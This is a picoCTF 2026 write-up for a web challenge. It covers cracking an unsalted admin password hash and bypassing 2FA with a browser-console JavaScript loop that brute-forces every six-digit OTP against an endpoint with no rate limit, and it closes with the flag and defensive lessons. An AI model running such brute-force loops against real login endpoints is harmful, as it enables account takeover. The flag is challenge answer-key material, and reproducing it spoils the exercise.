---
layout: post
title: "No FA"
date: 2026-03-20
categories: [picoctf2026, web]
ctf: picoctf2026
difficulty: Medium
points: 200
author: "matcha / Ding Jie"
description: "Cracking an unsalted password hash and brute-forcing an OTP with no rate limiter to bypass 2FA."
---

## Challenge

**Category:** Web · **Points:** 200 · **CTF:** picoCTF 2026

---

## Analysis

Reviewing the source code reveals two vulnerabilities:

1. **Unsalted password hashes** — passwords are hashed without a salt, making them crackable with rainbow tables or hashcat
2. **No rate limiter on OTP** — the two-factor authentication endpoint accepts unlimited guesses, enabling brute force

---

## Approach

**Step 1 — Find a target account**

Browse the database for a high-value account. The `admin` account has 2FA enabled — a good target.

**Step 2 — Crack the password hash**

The admin's hash cracks to `apple@123`. Log in with:
- Username: `admin`
- Password: `apple@123`

This lands on the 2FA page.

**Step 3 — Brute force the OTP**

Since there's no rate limiter, use the browser console to automate OTP guesses:

```javascript
for (let i = 0; i <= 999999; i++) {
    let otp = String(i).padStart(6, '0');
    let resp = await fetch('/verify-otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({otp: otp})
    });
    let data = await resp.json();
    if (data.success) {
        console.log('OTP found:', otp);
        break;
    }
}
```

The correct OTP is found and the flag is returned.

---

## Key Takeaway

Always salt password hashes (use bcrypt, argon2, or scrypt). Always rate-limit OTP endpoints — a 6-digit OTP has only 1,000,000 possible values and can be brute forced in minutes without throttling.

---

## Flag

```
picoCTF{n0_r4t3_n0_4uth_7bd3c284}
```
